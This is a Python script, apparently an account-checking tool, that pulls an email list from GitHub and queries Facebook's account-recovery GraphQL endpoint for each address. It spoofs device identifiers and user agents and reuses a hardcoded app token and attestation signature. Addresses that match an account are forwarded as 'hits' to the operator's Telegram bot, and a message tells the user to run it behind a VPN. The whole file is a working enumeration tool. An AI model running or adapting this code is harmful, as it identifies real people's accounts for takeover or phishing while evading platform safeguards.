import requests
import json
import os,sys
import time
import random
from uuid import uuid4
from fake_useragent import UserAgent


R = '\x1b[38;5;1m'   # أحمر
M = '\x1b[38;5;244m' # رمادي 
L = '\x1b[38;5;10m' #اخضر 
b = '\x1b[38;5;155m'
a = '\x1b[38;5;166m'


OK = 0
BAD = 0

tok = input(f"{L} [{M} TOKEN {L}] :")
os.system("clear")

id = input(f"{L} [{M} id {L}] :")
os.system("clear")


def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{tok}/sendMessage"
        data = {"chat_id": id, "text": message}
        requests.post(url, data=data, timeout=5)
    except:
        pass


url = "https://raw.githubusercontent.com/mesa14719-sketch/PY-COMBO/refs/heads/main/domain_email.txt"
response = requests.get(url)
emails = response.text.splitlines()

for user in emails:
    email = str(user).strip()
    ua = UserAgent()
    headers = {"User-Agent": ua.random, "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.search.async", "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", "x-fb-conn-uuid-client": str(uuid4()).replace("-", "")}
    clientinput = {"text_input_id": "lh37sk:580", "flash_call_permissions_status": {"READ_PHONE_STATE": "DENIED", "READ_CALL_LOG": "DENIED", "ANSWER_PHONE_CALLS": "DENIED"}, "was_headers_prefill_available": 0, "sfdid": str(uuid4()), "attestation_result": {"data": "", "signature": "MEUCIQCBSrzyU6wUrgZaV38L30a31rPMeiQcj2YCWvuL9zZZTwIgelOJPF+yzdSqoF0B8bsEZ04x1WMAE91/+p13tLvAPqmc=", "keyHash": "e93b8ab100a56f1ea430311c3c4dfb11d07b1b89eb65514bf45b08e1be98bec5"}, "fetched_email_token_list": {}, "search_query": email, "android_build_type": "", "sim_state": 5, "accounts_list": [], "is_oauth_without_permission": 0, "ig_oauth_token": [], "search_screen_type": "email", "is_whatsapp_installed": 1, "lois_settings": {"lois_token": ""}, "was_headers_prefill_used": 0, "headers_infra_flow_id": str(uuid4()), "fetched_email_list": [""], "sso_accounts_auth_data": [], "encrypted_msisdn": ""}
    serverparams = {"event_request_id": str(uuid4()), "is_from_logged_out": 0, "layered_homepage_experiment_group": None, "device_id": str(uuid4()), "waterfall_id": str(uuid4()), "INTERNAL__latency_qpl_instance_id": 1.29849323600707E14, "is_platform_login": 0, "context_data": "", "INTERNAL__latency_qpl_marker_id": 36707139, "family_device_id": str(uuid4()), "offline_experiment_group": None, "access_flow_version": "F2_FLOW", "is_from_logged_in_switcher": 0}
    inner_data = {"client_input_params": clientinput, "server_params": serverparams}
    var_payload = {"params": {"params": json.dumps(inner_data), "bloks_versioning_id": "24ee0ea0cc798aaa4d3e3c8a9055885112fb3d4213c4175bb6e9c76972ec34d1", "app_id": "com.bloks.www.caa.ar.search.async"}, "scale": "3", "nt_context": {"using_white_navbar": True, "styles_id": "2def2bac2d4f2b16ef7cbebba00a42f6", "pixel_ratio": 3, "is_push_on": True, "debug_tooling_metadata_token": None, "is_flipper_enabled": False, "theme_params": [{"value": ["BLUEPRINT_TEST_ROUNDED_CORNERS_NO_GUTTERS", "BLUEPRINT_TEST_GUTTER"], "design_system_name": "FDS"}], "bloks_version": "24ee0ea0cc798aaa4d3e3c8a9055885112fb3d4213c4175bb6e9c76972ec34d1"}}
    rest = {"method": "post", "pretty": "false", "format": "json", "server_timestamps": "true", "locale": "en_EN", "purpose": "fetch", "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.search.async", "fb_api_caller_class": "graphservice", "client_doc_id": "119940804216386667488826941930", "fb_api_client_context": "{\"is_background\":false}", "variables": json.dumps(var_payload), "fb_api_analytics_tags": "[\"GraphServices\"]", "client_trace_id": str(uuid4())}
    try:
        response = requests.post("https://graph.facebook.com/graphql", data=rest, headers=headers, timeout=5)
        try:
            response_json = response.json()
            response_text = json.dumps(response_json, ensure_ascii=False)
        except ValueError:
            response_text = response.text

        cleaned = response_text.encode("utf-8").decode("unicode-escape", errors="ignore")
        markers = ["fbcdn.net"]

        if any(marker in cleaned for marker in markers):
            OK += 1
            msg = f"NEW HITS FACBOOK\nemail : {email}\nDeveloper : @I_Z_E_E [🇩🇿]"
            send_telegram(msg)
        else:
            BAD += 1
            
        print(f"\r{L}  GOOD : [{OK}] {b} <<< {R} BAD : [{BAD}] {b} <<< {a}{email}", end="")

    except Exception:
        print(R+"  خطأ شغل vpn 1111")
        sys.exit()

    